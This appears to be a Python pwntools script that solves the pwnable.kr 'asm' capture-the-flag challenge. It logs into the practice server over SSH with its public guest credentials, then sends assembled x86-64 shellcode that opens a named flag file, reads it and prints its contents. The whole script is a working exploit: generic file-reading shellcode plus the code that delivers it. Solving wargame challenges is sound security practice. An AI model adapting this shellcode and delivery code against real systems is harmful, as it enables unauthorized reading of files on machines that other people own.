#!/bin/python 

from pwn import *
from pwnlib.tubes.ssh import ssh_process 

context.arch = "amd64"
context.log_level = "warn"

filename = b"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"

code = """
sub sp ,0x0101

xor rax,rax 
xor rdi , rdi
mov rsi, rsp
mov dx, 0x0101
syscall

xor rax,rax 
mov al,2
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall

mov  rcx,rax

xor rax,rax 
mov rdi , rcx
mov rsi, rsp
xor rdx,rdx
mov dx,0x0101
syscall

mov rcx,rax

xor rax,rax 
mov al,1
xor rdi,rdi
mov dil,1
mov rsi, rsp
mov rdx,rcx
syscall

xor rdi,rdi
xor rax,rax 
mov al,60
syscall
"""

payload = asm(code)

print("connecting to ssh ...")
s = ssh(user="asm",host="pwnable.kr",password="guest",port=2222)
print("ssh connected successfully.")

p = s.process(["nc","0","10015"])
if isinstance(p,ssh_process):
    p.sendline(payload)
    p.recv(timeout=1)
    p.sendline(filename)
    print(p.recvline(timeout=1).decode(),flush=True,end="")
    p.close()
